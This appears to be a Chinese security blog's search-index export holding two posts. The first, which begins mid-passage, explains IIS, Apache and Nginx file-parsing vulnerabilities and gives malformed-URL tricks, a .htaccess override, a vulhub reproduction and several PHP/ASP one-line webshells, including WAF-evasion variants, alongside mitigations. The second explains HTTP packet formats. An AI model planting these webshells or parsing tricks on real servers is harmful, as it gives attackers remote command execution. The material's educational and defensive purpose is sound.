href="http://www.xxxx.com/SingHeng.php/xxx.jpg%E8%BF%99%E6%A0%B7%E7%9A%84url%E6%97%B6%EF%BC%8C%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BC%9A%E9%BB%98%E8%AE%A4%E5%B0%86PHP%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E4%B8%BAphp%E6%96%87%E4%BB%B6%E3%80%82%E5%9B%A0%E6%AD%A4%E8%99%BD%E7%84%B6%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E4%B8%BAjpg%EF%BC%8C%E4%BD%86%E4%BE%9D%E7%84%B6%E4%BC%9A%E8%A2%AB%E4%BD%9C%E4%B8%BAPHP%E6%89%A7%E8%A1%8C%E3%80%82">www.xxxx.com/SingHeng.php/xxx.jpg这样的url时，服务器会默认将PHP目录下的文件解析为php文件。因此虽然文件后缀为jpg，但依然会被作为PHP执行。</a></p></blockquote><blockquote><p>在IIS5和IIS6版本中，当攻击者访问http：//<a href="http://www.xxxx.com/SingHeng.php%EF%BC%9B.jpg%E8%BF%99%E6%A0%B7%E7%9A%84url%E6%97%B6%EF%BC%8C%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BC%9A%E9%BB%98%E8%AE%A4%E4%B8%8D%E8%A7%A3%E6%9E%90%E2%80%9C%EF%BC%9B%E2%80%9D%E5%90%8E%E9%9D%A2%E7%9A%84%E5%86%85%E5%AE%B9%EF%BC%8C%E5%9B%A0%E6%AD%A4SingHeng.php%EF%BC%9B.jpg%E5%B0%B1%E8%A2%AB%E4%BD%9C%E4%B8%BASingHeng.php%E8%A7%A3%E6%9E%90%E6%89%A7%E8%A1%8C%E3%80%82">www.xxxx.com/SingHeng.php；.jpg这样的url时，服务器会默认不解析“；”后面的内容，因此SingHeng.php；.jpg就被作为SingHeng.php解析执行。</a></p></blockquote><blockquote><p>IIs畸形解析漏洞<br>在 IIS7.0中，在默认Fast-CGI开启状况下，我们往图片里面写入下面的代码<br><!--?php fputs(fopen("shell.php",“w”），“<?php @eval($eval($_POST[x])?-->“)?&gt;<br>将文件保存成test.jpg格式，上传到服务器，假设上传路径为/upload，上传成功后，直接访问/upload/test.jpg/x.php，此时神奇的畸形解析开始发挥作用啦。test.jpg将会被服务器当成php文件执行，所以图片里面的代码就会被执行。我们会神奇的发现在/upload 目录下创建了一个一句话木马文件 shell.php</p></blockquote><h3 id="2-Apache解析漏洞"><a href="#2-Apache解析漏洞" class="headerlink" title="2.Apache解析漏洞"></a><span>2.Apache解析漏洞</span></h3><p>在Apache2.2版本以前，Apache解析文件的规则为从右向左开始判断解析。如果后缀名为不可识别的文件类型，就再向左判断。比如xxxx.php.owf.rar文件，因为owf和rar都不是Apache可以识别解析的，因此Apache会将其解析为xxxx.php。<br>通过.htaccess文件绕过，先上传一个.htaccess文件内容如下</p><blockquote><p><strong>&lt;FilesMatch “3”&gt;<br>    SetHandler application/x-httpd-php<br> &lt;/FilesMatch&gt;</strong></p></blockquote><p> 只要文件名中包含了3这个数字就会被当作php文件执行<br> <img src="/img/01.png" alt=" " title="上传成功3.php"></p><p>apache漏洞主要形成于网站的配置文件，如果配置不当，很有可能出现解析漏洞，如下是存在的主要原因：</p><blockquote><p><strong>1.Apache 解析文件的规则是从右到左开始判断解析，如果后缀名为不可识别文件解析，就再往左判断。<br>2.AddType application/x-httpd-php .jpg   有可能导致解漏洞<br>3.AddHandler 也有可能导致解析漏洞</strong></p></blockquote><p>防止绕过解析漏洞的方式：</p><blockquote><p><strong>1.开启重写模块<br>2.可以在mime.types文件里面定义常用的一些扩展名<br>3.上传文件强制改名</strong></p></blockquote><h3 id="3-Nginx解析漏洞"><a href="#3-Nginx解析漏洞" class="headerlink" title="3.Nginx解析漏洞"></a><span>3.Nginx解析漏洞</span></h3><p>在Nginx 0.8.41到1.5.6的版本中，攻击者可以利用多种方式解析文件。攻击者正常访问http：//<a href="http://www.test.com/image/bitsec.jpg%E6%97%B6%EF%BC%8C%E4%BC%9A%E6%AD%A3%E5%B8%B8%E6%98%BE%E7%A4%BA%E5%9B%BE%E7%89%87%E3%80%82%E4%BD%86%E6%98%AF%E5%BD%93%E6%94%BB%E5%87%BB%E8%80%85%E9%80%9A%E8%BF%87%E4%B8%8B%E9%9D%A2%E7%9A%84%E6%96%B9%E5%BC%8F%E8%BF%9B%E8%A1%8C%E8%AE%BF%E9%97%AE%E6%97%B6%EF%BC%8C%E5%B0%B1%E8%A2%AB%E8%A7%A3%E6%9E%90%E4%B8%BAPHP%E6%96%87%E4%BB%B6%E3%80%82">www.test.com/image/bitsec.jpg时，会正常显示图片。但是当攻击者通过下面的方式进行访问时，就被解析为PHP文件。</a></p><blockquote><p><strong>http：//<a href="http://www.test.com/image/bitsec.jpg/bitsec.php">www.test.com/image/bitsec.jpg/bitsec.php</a> （目录解析）<br>http：//<a href="http://www.test.com/image/bitsec.jpg%00.php">www.test.com/image/bitsec.jpg%00.php</a>     （截断解析）<br>http：//<a href="http://www.test.com/image/bitsec.jpg%20/0.php">www.test.com/image/bitsec.jpg%20\0.php</a>   （截断解析）</strong></p></blockquote><p>接下来的一个漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞</p><p>首先我们要知道cgi.fix_pathinfo与security.limit_extensions</p><blockquote><p>cgi.fix_pathinfo</p><blockquote><p>该选项位于配置文件php.ini中，默认值为1，表示开启。当php遇到文件路径/test.png/x.php时，若/test.png/x.php不存在，则会去掉最后的/x.php，然后判断/test.png是否存在，若存在，则把/test.png当做文件/test.png/x.php解析，如若test.png还不存在如果在其前面还有后缀，继续前面的步骤，以此类推。若是关闭该选项，访问/test.jpg/x.php 只会返回找不到文件。</p></blockquote></blockquote><blockquote><p>security.limit_extensions</p><blockquote><p>在我的配置文件中，它位于/etc/php-fpm.d/<a href="http://www.conf中/">www.conf中</a><br>这个选项开始是被注释了的也就是默认只允许执行php文件，可以在后面添加其它后缀，比如<br>security.limit_extensions .jpg .php<br>像这样添加.jpg之后，.jpg文件也能以php格式来执行<br>修改了后需要service php-fpm restart重启php</p></blockquote></blockquote><p>复现过程<br>复现环境：借助vulhub的docker测试环境<br>直接进入到路径</p><blockquote><p>nginx/nginx_parsing_vulnerability</p></blockquote><p>运行</p><blockquote><p>docker-compose up -d</p></blockquote><p>启动之后我们直接查看网关地址进行访问<br><img src="/img/02.jpg" alt=" " title="网关地址配置"><br><img src="/img/03.jpg" alt=" " title="网关地址配置"></p><p>上传图片木马成功之后，返回图片地址<br><img src="/img/03.jpg" alt=" " title="返回地址"><br>访问成功<br><img src="/img/04.jpg" alt=" " title="成功访问"></p><p>增加/x.php，可以发现图片就被解析成PHP文件<br><img src="/img/05.jpg" alt=" " title="解析成为php"></p><p>由于nginx做了如上配置，如果碰到.php后缀的就交给fastcgi来解析，因此我们可构造/test.jpg/.php(此处的.php必须是服务器端目录下不存在的如x.php等)，这里的test.jpg就是我们上传的图片木马<br>当fastcgi处理x.php时，发现文件不存在，这里php.ini配置文件中的cgi.fix_pathinfo=1就发挥了作用，如果当前路径不存在，就返回上层路径即test.jpg，此时fastcig就将test.jpg格式文件当php来解析了<br>但是，在php-fpm.conf配置文件中的security.limit_extensions配置项限制了fastcgi要解析的文件类型（如果该选项未开启，默认只解析.php）<br>查看配置文件发现这里未限制fastcgi要解析的格式，故造成nginx因错误配置不当发现解析漏洞</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a><span>漏洞修复</span></h3><blockquote><p>在php版本比较低时，将php.ini文件中的cgi.fix_pathinfp的值设置为0，即关闭cgi解析<br>php-fpm.conf中的 security.limit_extensions =.php，即仅支持.php后缀解析</p></blockquote><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a><span>一句话木马</span></h2><p> 攻击者通过浏览器或者其他远程连接工具，连接该后端网页，得到一个命令执行环境，以达到控制目标服务器的目的</p><h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a><span>危害</span></h3><p>查看、上传、下载、修改文件，操作数据库，执行任意命令，提权，且webshell隐蔽性特别高，可以穿越防火墙等设备，访问webshell时不会留下日志文件</p><h3 id="常见的一句话木马"><a href="#常见的一句话木马" class="headerlink" title="常见的一句话木马"></a><span>常见的一句话木马</span></h3><p>常见的一句话木马包括PHP、ASP、ASP.NET、JSP等语言形式。常见的代码形式包括</p><blockquote><p>PHP: &nbsp;&lt;?php @eval($_POST[‘test’])；?&gt;、<!--?php system($_GET['cmd'])；?--><br>         //@：表示后面即使执行错误，也不报错<br>         //eval（）函数：表示括号内的语句字符串全都当代码执行<br>         //$_POST[‘test’]：表示从页面中获得test这个参数值<br>ASP:   &lt;%eval request(“test”) %&gt;</p></blockquote><p>1、普通一句话：</p><blockquote><p>&lt;?php<br>@eval($_POST[xxxxx]);<br>?&gt;</p></blockquote><p>*post后面中括号里面的内容是使用菜刀或蚁剑连接时的密码</p><p>2、防爆破一句话：</p><blockquote><p>&lt;?php<br>substr(md5($_REQUEST[‘x’]),28)==’6862’&amp;&amp;eval($_REQUEST[‘password’]);<br>?&gt;<br>*菜刀地址<a href="http://192.168.64.137/x.php?x=myh0st">http://192.168.64.137/x.php?x=myh0st</a></p></blockquote><p>3、过狗一句话:</p><blockquote><p>&lt;?php<br>($_=@$<em>GET[s]).@$</em>($_POST[hihack])<br>?&gt; //菜刀地址 <a href="http://localhost/1.php?s=assert">http://localhost/1.php?s=assert</a><br>&lt;php $a = “a”.”s”.”s”.”e”.”r”.”t”;$a($_POST[hihack]);<br>?&gt;</p></blockquote><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>文件上传配合解析漏洞是最理想的状态，有些是用户的配置不当造成的还有的是本身中间件的问题，网站管理员在配置时尤其要为注意这些事情，<br>文件上传与文件解析漏洞的防御</p><blockquote><p>1.文件上传目录设置为不可执行。 主要Web服务器无法解析该目录下的文件， 即使攻击者成功上传了恶意脚本文件，服务器也不会受到影响。</p></blockquote><blockquote><p>2.把上传的文件存放在独立的存储上</p></blockquote><blockquote><p>3.使用随机数改写文件名和文件路径。文件上传之后，攻击者需要能访问该文件，如果能够阻止攻击者对文件的访问，同样可以阻止攻击者的攻击行为。如果使用随机数改写文件和路径，将会极大的增加攻击者的成本。比如PHP中可以通过uniqid（0函数生成一个唯一的ID,随后使用MD5对文件名进行重命名，可以防护00截断攻击。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> web漏洞 </category>
          
          <category> 网站中间件 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web漏洞 </tag>
            
            <tag> 文件上传漏洞 </tag>
            
            <tag> 解析漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于数据包的那些事</title>
      <link href="/year/12/26/di-yi-pian-zheng-shi-de-bo-ke/"/>
      <url>/year/12/26/di-yi-pian-zheng-shi-de-bo-ke/</url>
      
        <content type="html"><![CDATA[<h2 id="数据包"><a href="#数据包" class="headerlink" title="数据包"></a><font size="6" color="blue">数据包</font></h2><p>数据包的结构：数据包的结构非常复杂，不是三言两语能够说清的，在这里主要了解一下它的关键构成就可以了，这对于理解TCP/IP协议的通信原理是非常重要的。数据包主要由“目的IP地址”、“源IP地址”、“净载数据”等部分构成，包括包头和包体，包头是固定长度，包体的长度不定，各字段长度固定，双方的请求数据包和应答数据包的包头结构是一致的，不同的是包体的定义。 数据包的结构与我们平常写信非常类似，目的IP地址是说明这个数据包是要发给谁的，相当于收信人地址；源IP地址是说明这个数据包是发自哪里的，相当于发信人地址；而净载数据相当于信件的内容。 正是因为数据包具有这样的结构，安装了TCP/IP协议的计算机之间才能相互通信。我们在使用基于TCP/IP协议的网络时，网络中其实传递的就是数据包。理解数据包，对于网络管理的网络安全具有至关重要的意义。</p><h3 id="Request-请求数据包数据格式"><a href="#Request-请求数据包数据格式" class="headerlink" title="Request 请求数据包数据格式 "></a><font size="6" color="blue">Request 请求数据包数据格式 </font></h3><blockquote><p>Request Headers<br>POST&nbsp;/adduser&nbsp;HTTP/1.1<br>Host:&nbsp;localhost:8030<br>Connection:&nbsp;keep-alive<br>Content-Length:16<br>Pragma:&nbsp;no-cache<br>Cache-Control:&nbsp;no-cache<br>Origin:&nbsp;chrome-extension://fdmmgilgnpjigdojojpjoooidkmcomcm<br>User-Agent:&nbsp;Mozilla/5.0(Windows&nbsp;NT&nbsp;6.1;&nbsp;Win64;&nbsp;x64)&nbsp;AppleWebKit/537.36{KHTML,&nbsp;like&nbsp;Gecko)<br>Chrome/66.0.3359.181&nbsp;Safari/537.36<br>Content-Type:&nbsp;application/x-www-form-urlencoded<br>VAccept:<em>/</em><br>Accept-Encoding:&nbsp;gzip,&nbsp;deflate<br>Accept-Language:&nbsp;zh-CN,zh;q=0.9<br>Form Data<br>name=name&amp;age=11</p></blockquote><p>请求行<br> 请求行由三个标记组成：请求方法、请求 URL 和 HTTP 版本，它们用空格分享。<br> 例如：GET /index.html HTTP/1.1</p><blockquote><p>HTTP 规划定义了8种可能的请求方法：<br>1.GET：检索 URL 中标识资源的一个简单请求<br>2.HEAD：与 GET 方法相同，服务器只返回状态行和头标，并不返回请求文档<br>3.POST：服务器接受被写入客户端输出流中的数据的请求<br>4.PUT：服务器保存请求数据作为指定 URL 新内容的请求<br>5.DELETE：服务器删除 URL 中命令的资源的请求<br>6.OPTIONS：关于服务器支持的请求方法信息的请求<br>7.TRACE：web 服务器反馈 Http 请求和其头标的请求<br>8.CONNECT ：已文档化，但当前未实现的一个方法，预留做隧道处理</p></blockquote><p>请求头<br>由关键字/值对组成，每行一对，关键字和值用冒号分享。请求头标通知服务器腾于客户端的功能和标识。</p><blockquote><p>HOST:&nbsp;主机或域名地址<br>Accept：指浏览器或其他客户可以接爱的 MIME 文件格式。Servlet 可以根据它判断并返回适当的文件格<br>式。<br>User-Agent：是客户浏览器名称<br>Host：对应网址 URL 中的 Web 名称和端口号。<br>Accept-Langeuage：指出浏览器可以接受的语言种类，如 en 或 en-us，指英语。<br>connection：用来告诉服务器是否可以维持固定的 HTTP 连接。http 是无连接的，HTTP/1.1 使用 Keep-Alive<br>为默认值，这样，当浏览器需要多个文件时(比如一个&nbsp;HTML&nbsp;文件和相关的图形文件)，不需要每次都建立<br>连接<br>Cookie：浏览器用这个属性向服务器发送 Cookie。Cookie 是在浏览器中寄存的小型数据体，它可以记载<br>和服务器相关的用户信息，也可以用来实现会话功能。<br>Referer ：&nbsp;表&nbsp;明&nbsp;产&nbsp;生&nbsp;请&nbsp;求&nbsp;的&nbsp;网&nbsp;页 URL 。&nbsp;如&nbsp;比&nbsp;从&nbsp;网&nbsp;页&nbsp;/icconcept/index.jsp 中&nbsp;点&nbsp;击&nbsp;一&nbsp;个&nbsp;链&nbsp;接&nbsp;到&nbsp;网&nbsp;页<br>/icwork/search&nbsp;，&nbsp;在&nbsp;向&nbsp;服&nbsp;务&nbsp;器&nbsp;发&nbsp;送&nbsp;的&nbsp;GET/icwork/search&nbsp;中&nbsp;的&nbsp;请&nbsp;求&nbsp;中&nbsp;，&nbsp;Referer&nbsp;是<br><a href="http://hostname:8080/icconcept/index.jsp%E3%80%82%E8%BF%99%E4%B8%AA%E5%B1%9E%E6%80%A7%E5%8F%AF%E4%BB%A5%E7%94%A8%E6%9D%A5%E8%B7%9F%E8%B8%AA">http://hostname:8080/icconcept/index.jsp。这个属性可以用来跟踪</a> Web 请求是从什么网站来的。<br>Content-Type：用来表名 request 的内容类型。可以用 HttpServletRequest 的 getContentType()方法取得。<br>Accept-Charset：指出浏览器可以接受的字符编码。英文浏览器的默认值是 ISO-8859-1.<br>Accept-Encoding：指出浏览器可以接受的编码方式。编码方式不同于文件格式，它是为了压缩文件并加<br>速文件传递速度。浏览器在接收到 Web 响应之后先解码，然后再检查文件格式。</p></blockquote><p>空行<br> 最后一个请求头标之后是空行，发送回车符和退行，通知服务器以下不再有头标。</p><p>请求数据<br> 使用 POST 传送，最常使用的是 Content-Type 和 Content-Length 头标。</p><h3 id="Response-返回数据包数据格式"><a href="#Response-返回数据包数据格式" class="headerlink" title="Response 返回数据包数据格式"></a><font size="6" color="blue">Response 返回数据包数据格式</font></h3><p>一个响应由四个部分组成；状态行、响应头标、空行、响应数据。</p><blockquote><p>1.状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔<br>2.响应头标：包含服务器类型、日期、长度、内容类型等<br>3.空行：响应头与响应体之间用空行隔开<br>4.响应数据：浏览器会将实体内容中的数据取出来，生成相应的页面</p></blockquote><p>HTTP 响应码：</p><blockquote><p>1xx：信息，请求收到，继续处理<br>2xx：成功，行为被成功地接受、理解和采纳<br>3xx：重定向，为了完成请求，必须进一步执行的动作<br>4xx：客户端错误<br>5xx：服务器错</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数据包 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据包格式 </tag>
            
            <tag> web那些事 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
